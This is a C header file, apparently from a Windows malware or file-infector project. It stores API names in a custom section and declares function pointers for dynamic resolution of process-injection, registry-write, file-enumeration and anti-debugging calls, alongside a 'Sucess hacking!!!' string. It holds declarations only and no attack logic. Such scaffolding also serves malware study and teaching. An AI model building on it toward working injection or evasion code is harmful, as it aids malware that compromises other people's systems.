#pragma once 
#include <Windows.h>
// #include <winternl.h>

#pragma section(".fname", read, write)

__declspec (allocate(".fname")) char aCreateFileA[] = "CreateFileA";
__declspec (allocate(".fname")) char aCreateFileMappingA[] = "CreateFileMappingA";
__declspec (allocate(".fname")) char aMapViewOfFile[] = "MapViewOfFile";
__declspec (allocate(".fname")) char aCloseHandle[] = "CloseHandle";
__declspec (allocate(".fname")) char aUnmapViewOfFile[] = "UnmapViewOfFile";
__declspec (allocate(".fname")) char aGetProcAddress[] = "GetProcAddress";
__declspec (allocate(".fname")) char aUser32dll[] = "user32.dll";
__declspec (allocate(".fname")) char aGetFileSize[] = "GetFileSize";
__declspec (allocate(".fname")) char aGetModuleFileNameA[] = "GetModuleFileNameA";
__declspec (allocate(".fname")) char aRtlCopyMemory[] = "RtlCopyMemory";
__declspec (allocate(".fname")) char aMessageBoxA[] = "MessageBoxA";
__declspec (allocate(".fname")) char aFindFirstFileA[] = "FindFirstFileA";
__declspec (allocate(".fname")) char aFindNextFileA[] = "FindNextFileA";
__declspec (allocate(".fname")) char aFindClose[] = "FindClose";
__declspec (allocate(".fname")) char aLoadLibraryA[] = "LoadLibraryA";
__declspec (allocate(".fname")) char aUser32[] = "User32.dll";
__declspec (allocate(".fname")) char aNtDlldll[] = "NtDll.dll";
__declspec (allocate(".fname")) wchar_t aKernel32dll[] = L"Kernel32.dll";
__declspec (allocate(".fname")) char aOurGoal[] = "Sucess hacking!!!";
__declspec (allocate(".fname")) char aExitProcess[] = "ExitProcess";
__declspec (allocate(".fname")) char aNtQueryInformationProcess[] = "NtQueryInformationProcess";
__declspec (allocate(".fname")) char aGetCurrentProcess[] = "GetCurrentProcess";
__declspec (allocate(".fname")) char aAdvapi32[] = "Advapi32.dll";
__declspec (allocate(".fname")) char aRegOpenKeyExA[] = "RegOpenKeyExA";
__declspec (allocate(".fname")) char aRegQueryValueExA[] = "RegQueryValueExA";
__declspec (allocate(".fname")) char aRegCloseKey[] = "RegCloseKey";
__declspec (allocate(".fname")) char aDbgDetected[] = "Debugger Detected!";
__declspec (allocate(".fname")) char aVirtualAllocEx[] = "VirtualAllocEx";
__declspec (allocate(".fname")) char aWriteProcessMemory[] = "WriteProcessMemory";
__declspec (allocate(".fname")) char aVirtualProtectEx[] = "VirtualProtectEx";
__declspec (allocate(".fname")) char aCreateRemoteThread[] = "CreateRemoteThread";
__declspec (allocate(".fname")) char aVirtualProtect[] = "VirtualProtect";
__declspec (allocate(".fname")) char aVirtualAlloc[] = "VirtualAlloc";
__declspec (allocate(".fname")) char aCreateThread[] = "CreateThread";
__declspec (allocate(".fname")) char aRegOpenKeyA[] = "RegOpenKeyA";
__declspec (allocate(".fname")) char aRegSetValueExA[] = "RegSetValueExA";
__declspec (allocate(".fname")) char aOpenProcess[] = "OpenProcess";
__declspec (allocate(".fname")) char aRegQueryValueA[] = "RegQueryValueA";
//__declspec (allocate(".fname")) // const char * aCreateFileMappingA = "CreateFileMappingA";
__declspec (allocate(".fname")) char aMappingNam[]  = "Global\\Shaco";
__declspec (allocate(".fname")) char aNtSetInformationProcess[] = "NtSetInformationProcess";
__declspec (allocate(".fname")) char aSleep[] = "Sleep";
__declspec (allocate(".fname")) char aNtAllocateVirtualMemory[] = "NtAllocateVirtualMemory";


/////// Pure copy, but there is no point in coding them again as it only declare string and define func pointer (rename ???)
typedef HANDLE(WINAPI * pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
                                         LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
                                         DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef HANDLE(WINAPI *pCreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
                                                DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow,
                                                LPCSTR lpName);
typedef LPVOID(WINAPI *pMapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh,
                                           DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
typedef BOOL(WINAPI *pUnmapViewOfFile)(LPCVOID lpBaseAddress);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE hObject);

typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef DWORD(WINAPI *pGetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
typedef DWORD(WINAPI *pGetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
typedef void(WINAPI *pRtlCopyMemory)(void *Destination, VOID *Source, size_t Length);

typedef HANDLE(WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *pFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *pFindClose)(HANDLE hFindFile);
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR lpLibFileName);
typedef int(WINAPI *pMessageBoxA)(HWND hWnd, LPSTR lpText, LPSTR lpCaption, UINT uType);
typedef VOID(WINAPI *pExitProcess)(UINT uExitCode);
typedef HANDLE(WINAPI *pGetCurrentProcess)();

typedef LSTATUS(WINAPI *pRegOpenKeyExA)(HKEY hKey,
                                        LPCSTR lpSubKey,
                                        DWORD ulOptions,
                                        REGSAM samDesired,
                                        PHKEY phkResult);
typedef LSTATUS(WINAPI *pRegQueryValueExA)(HKEY hKey,
                                            LPCSTR lpValueName,
                                            LPDWORD lpReserved,
                                            LPDWORD lpType,
                                            LPBYTE lpData,
                                            LPDWORD lpcbData);
typedef LSTATUS(WINAPI *pRegCloseKey)(HKEY hKey);
typedef LPVOID(WINAPI* pVirtualAllocEx)( HANDLE hProcess,
                                LPVOID lpAddress,
                                SIZE_T dwSize,
                                DWORD  flAllocationType,
                                DWORD  flProtect);

typedef BOOL (WINAPI *pWriteProcessMemory)( HANDLE  hProcess,
                                LPVOID  lpBaseAddress,
                                LPCVOID lpBuffer,
                                SIZE_T  nSize,
                                SIZE_T  *lpNumberOfBytesWritten);
typedef BOOL (WINAPI *pVirtualProtectEx)(
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
);
typedef BOOL (WINAPI *pVirtualProtect)(
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
);
typedef HANDLE (WINAPI *pCreateRemoteThread)(
        HANDLE                       hProcess,
        LPSECURITY_ATTRIBUTES        lpThreadAttributes,
        SIZE_T                       dwStackSize,
        LPTHREAD_START_ROUTINE       lpStartAddress,
        LPVOID                       lpParameter,
        DWORD                        dwCreationFlags,
        LPDWORD                      lpThreadId
);

typedef LPVOID(WINAPI* pVirtualAlloc)(
                                LPVOID lpAddress,
                                SIZE_T dwSize,
                                DWORD  flAllocationType,
                                DWORD  flProtect);
typedef HANDLE (WINAPI *pCreateThread)(
        LPSECURITY_ATTRIBUTES   lpThreadAttributes,
        SIZE_T                  dwStackSize,
        LPTHREAD_START_ROUTINE  lpStartAddress,
        LPVOID                  lpParameter,
        DWORD                   dwCreationFlags,
        LPDWORD                 lpThreadId
);
typedef LSTATUS(WINAPI *pRegOpenKeyA)(
        HKEY   hKey,
        LPCSTR lpSubKey,
        PHKEY  phkResult
);
typedef LSTATUS(WINAPI * pRegSetValueExA)(
        HKEY       hKey,
        LPCSTR     lpValueName,
        DWORD      Reserved,
        DWORD      dwType,
        const BYTE *lpData,
        DWORD      cbData
);
typedef HANDLE(WINAPI *pOpenProcess)(
        DWORD dwDesiredAccess,
        BOOL  bInheritHandle,
        DWORD dwProcessId
);
typedef LSTATUS(WINAPI *pRegQueryValueA)(
        HKEY   hKey,
        LPCSTR lpSubKey,
        LPSTR  lpData,
        PLONG  lpcbData
);
typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
    HANDLE hProcess,
    PROCESS_INFORMATION_CLASS ProcessInformationClass,
    LPVOID ProcessInformation,
    DWORD ProcessInformationSize
);
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
    DWORD Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    DWORD* OldStatus
);

typedef void(NTAPI * pSleep)(DWORD dwMilliseconds);

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE hProcess,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );
